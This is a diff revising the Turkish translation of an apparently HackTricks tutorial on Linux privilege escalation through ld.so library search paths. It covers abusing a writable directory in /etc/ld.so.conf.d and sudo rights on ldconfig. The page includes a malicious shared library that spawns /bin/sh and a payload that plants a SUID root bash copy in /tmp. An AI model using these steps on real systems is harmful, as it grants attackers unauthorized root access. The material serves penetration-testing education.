@@ -1,4 +1,4 @@
-# ld.so privesc exploit örneği
+# ld.so privesc exploit example
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -40,14 +40,14 @@ puts("Hi");
 {{#endtab}}
 {{#endtabs}}
 
-1. Bu dosyaları makinenizde aynı klasörde **oluşturun**
-2. **Kütüphaneyi** **derleyin**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
-3. `libcustom.so` dosyasını `/usr/lib` konumuna **kopyalayın** ve cache'i yenileyin: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root yetkileri)
-4. **Çalıştırılabilir dosyayı derleyin**: `gcc sharedvuln.c -o sharedvuln -lcustom`
+1. Makinenizde aynı klasörde bu dosyaları **oluşturun**
+2. **library**'yi **derleyin**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
+3. `libcustom.so` dosyasını `/usr/lib` klasörüne **kopyalayın** ve önbelleği yenileyin: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root yetkileri)
+4. **executable**'ı **derleyin**: `gcc sharedvuln.c -o sharedvuln -lcustom`
 
 ### Ortamı kontrol edin
 
-_libcustom.so_ dosyasının _/usr/lib_ konumundan **yüklendiğini** ve binary'yi **çalıştırabildiğinizi** kontrol edin.
+_libcustom.so_'nun **/usr/lib** klasöründen **yüklendiğini** ve binary'yi **çalıştırabildiğinizi** kontrol edin.
 ```
 $ ldd sharedvuln
 linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
@@ -61,7 +61,7 @@ Hi
 ```
 ### Faydalı triage komutları
 
-Gerçek bir hedefe saldırırken binary'nin ihtiyaç duyduğu **tam library adını** ve loader'ın **şu anda neyi resolve ettiğini** doğrulayın:
+Gerçek bir hedefe saldırırken binary'nin ihtiyaç duyduğu **tam library adını** ve loader'ın **şu anda neyi çözdüğünü** doğrulayın:
 ```bash
 readelf -d ./sharedvuln | grep NEEDED
 ldconfig -p | grep libcustom
@@ -69,29 +69,20 @@ ldconfig -p | grep libcustom
 # x86_64; adjust for your arch
 LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
 ```
-Birkaç kullanışlı önemli nokta:
+Birkaç yararlı püf noktası:
 
-- `sudo echo ... > /etc/ld.so.conf.d/x.conf` genellikle **çalışmaz**, çünkü
-yönlendirme mevcut shell'iniz tarafından gerçekleştirilir. Bunun yerine
-`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` kullanın.
-- **SUID/privileged** binary'ler, **secure-execution mode** içindeyken
-`LD_LIBRARY_PATH`/`LD_PRELOAD` değerlerini yok sayar; ancak
-`/etc/ld.so.conf` dosyasından gelen dizinler hâlâ güvenilir loader yapılandırmasının
-parçasıdır. Bu nedenle bu yanlış yapılandırma privileged programları yine de
-etkileyebilir.
-- Daha yeni glibc sürümlerinde dynamic loader, cache çözümlemesini ve bir hijack
-beklendiği gibi çalışmadığında `glibc-hwcaps` alt dizin seçimini debug etmek için
-kullanışlı olan `--list-diagnostics` seçeneğini de sunar.
+- `sudo echo ... > /etc/ld.so.conf.d/x.conf` genellikle **çalışmaz**, çünkü yönlendirme mevcut shell'iniz tarafından gerçekleştirilir. Bunun yerine `echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` kullanın.
+- **SUID/privileged** binary'ler **secure-execution mode** içinde `LD_LIBRARY_PATH`/`LD_PRELOAD` değerlerini yok sayar; ancak `/etc/ld.so.conf` dosyasından gelen dizinler hâlâ güvenilen loader yapılandırmasının bir parçasıdır. Bu nedenle bu yanlış yapılandırma privileged programları yine de etkileyebilir.<sup>[[1]](#references)</sup>
+- Daha yeni glibc sürümlerinde dynamic loader, cache çözümlemesini ve bir hijack beklenen şekilde çalışmadığında `glibc-hwcaps` alt dizini seçimini debug etmek için kullanışlı olan `--list-diagnostics` seçeneğini de sunar.<sup>[[1]](#references)</sup>
 
 ## Exploit
 
-Bu senaryoda, **birinin** _/etc/ld.so.conf/_ içindeki bir dosyaya
-**vulnerable bir entry** eklediğini varsayacağız:
+Bu senaryoda, **birinin** _/etc/ld.so.conf/_ içindeki bir dosyaya **vulnerable bir entry** eklediğini varsayacağız:
 ```bash
 echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
 ```
-Savunmasız klasör _/home/ubuntu/lib_ (yazma erişimimizin olduğu yer).\
-**Aşağıdaki kodu** bu yolun içinde **indirin ve derleyin**:
+Güvenlik açığı bulunan klasör _/home/ubuntu/lib_ klasörüdür (bu klasöre yazma erişimimiz vardır).\
+**Aşağıdaki kodu bu yolun içinde indirin ve derleyin:**
 ```c
 // gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c
 
@@ -107,13 +98,13 @@ puts("I'm the bad library");
 system("/bin/sh");
 }
 ```
-Daha sonra **root** (veya başka bir ayrıcalıklı hesabın) güvenlik açığı bulunan **binary** dosyasını çalıştırmasını bekliyorsanız, genellikle etkileşimli bir **shell** başlatmak yerine **root** sahipliğinde bir **artifact** bırakmak daha iyidir. Örneğin:
+Daha sonra **root** (veya başka bir ayrıcalıklı hesabın) vulnerable binary'yi çalıştırmasını bekliyorsanız, interactive shell başlatmak yerine genellikle **root-owned artifact** bırakmak daha iyidir. Örneğin:
 ```c
 system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
 ```
-Ardından, ayrıcalıklı yürütme gerçekleştiğinde `/tmp/rootbash -p` kullanabilirsiniz.
+Ardından, ayrıcalıklı yürütme gerçekleştiğinde `/tmp/rootbash -p` komutunu kullanabilirsiniz.
 
-Artık **yanlış yapılandırılmış** path içerisinde kötü amaçlı libcustom library'sini **oluşturduğumuza** göre bir **reboot** gerçekleşmesini veya root kullanıcısının **`ldconfig`** çalıştırmasını beklememiz gerekir (_bu binary'yi **sudo** olarak çalıştırabiliyorsanız veya **suid bit**'ine sahipse, kendiniz çalıştırabilirsiniz_).
+Artık **yanlış yapılandırılmış** path içine kötü amaçlı libcustom library'sini **oluşturduğumuza** göre, bir **reboot** gerçekleşmesini veya root user'ın **`ldconfig`** komutunu execute etmesini beklememiz gerekir (_bu binary'yi **sudo** olarak execute edebiliyorsanız veya **suid bit**'ine sahipse, bunu kendiniz execute edebilirsiniz_).
 
 Bu gerçekleştiğinde, `sharedvuln` executable'ının `libcustom.so` library'sini nereden yüklediğini **yeniden kontrol edin**:
 ```c
@@ -132,18 +123,18 @@ $ whoami
 ubuntu
 ```
 > [!TIP]
-> Bu örnekte henüz yetkileri yükseltmediğimizi unutmayın; ancak çalıştırılan komutları değiştirerek ve **root veya başka bir yetkili kullanıcının vulnerable binary'yi çalıştırmasını bekleyerek** yetkileri yükseltebileceğiz.
+> Bu örnekte henüz ayrıcalıkları yükseltmediğimizi unutmayın; ancak çalıştırılan komutları değiştirip **root veya başka bir ayrıcalıklı kullanıcının güvenlik açığı bulunan binary'yi çalıştırmasını bekleyerek** ayrıcalıkları yükseltebiliriz.
 
-### Diğer misconfiguration'lar - Aynı vuln
+### Diğer yanlış yapılandırmalar - Aynı güvenlik açığı
 
-Önceki örnekte bir yöneticinin **bir configuration file içinde `/etc/ld.so.conf.d/` altında yetkisiz bir folder tanımladığı** bir misconfiguration'ı taklit ettik.\
-Ancak aynı vulnerability'ye neden olabilecek başka misconfiguration'lar da vardır. `/etc/ld.so.conf.d` içindeki herhangi bir **config file** üzerinde, `/etc/ld.so.conf.d` folder'ında veya `/etc/ld.so.conf` file'ında **write permissions**'a sahipseniz aynı vulnerability'yi configure edip exploit edebilirsiniz.
+Önceki örnekte, bir yöneticinin **`/etc/ld.so.conf.d/` içindeki bir configuration file içerisine ayrıcalıksız bir klasör eklediği** bir yanlış yapılandırmayı taklit ettik.\
+Ancak aynı güvenlik açığına yol açabilecek başka yanlış yapılandırmalar da vardır; `/etc/ld.so.conf.d` içindeki herhangi bir **config file** üzerinde, `/etc/ld.so.conf.d` klasöründe veya `/etc/ld.so.conf` dosyasında **write permissions** sahibiyseniz aynı güvenlik açığını yapılandırıp exploit edebilirsiniz.
 
 ## Exploit 2
 
-**`ldconfig` üzerinde sudo privileges'a sahip olduğunuzu varsayalım**.\
-`ldconfig`'e **conf file'larını nereden yükleyeceğini belirtebilirsiniz**; böylece `ldconfig`'in arbitrary folder'ları yüklemesini sağlayarak bundan yararlanabiliriz.\
-Öyleyse `"/tmp"`'yi yüklemek için gereken file ve folder'ları oluşturalım:
+**`ldconfig` üzerinde sudo privileges sahibi olduğunuzu varsayalım**.\
+`ldconfig`'e **conf dosyalarının nereden yükleneceğini belirtebilirsiniz**; böylece `ldconfig`'in arbitrary klasörleri yüklemesini sağlayabiliriz.<sup>[[2]](#references)</sup>\
+Şimdi "/tmp" klasörünü yüklemek için gereken dosya ve klasörleri oluşturalım:
 ```bash
 cd /tmp
 mkdir -p conf
@@ -151,7 +142,7 @@ echo "include /tmp/conf/*" > fake.ld.so.conf
 echo "/tmp" > conf/evil.conf
 ```
 Şimdi, **previous exploit** bölümünde belirtildiği gibi, **malicious library** dosyasını `/tmp` içinde oluşturun.\
-Son olarak, yolu yükleyelim ve binary dosyanın library dosyasını nereden yüklediğini kontrol edelim:
+Ve son olarak, path'i yükleyip binary'nin library'yi nereden yüklediğini kontrol edelim:
 ```bash
 sudo ldconfig -f fake.ld.so.conf
 
@@ -161,12 +152,11 @@ libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
 libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
 /lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
 ```
-**Gördüğünüz gibi, `ldconfig` üzerinde sudo ayrıcalıklarına sahip olduğunuzda aynı güvenlik açığından yararlanabilirsiniz.**
-
-
+**Gördüğünüz gibi, `ldconfig` üzerinde sudo ayrıcalıklarına sahip olarak aynı güvenlik açığından yararlanabilirsiniz.**
 
 ## Referanslar
 
-- [ld.so(8) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/ld.so.8.html)
-- [ldconfig(8) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
+- [1] [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
+- [2] [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
+
 {{#include ../../banners/hacktricks-training.md}}
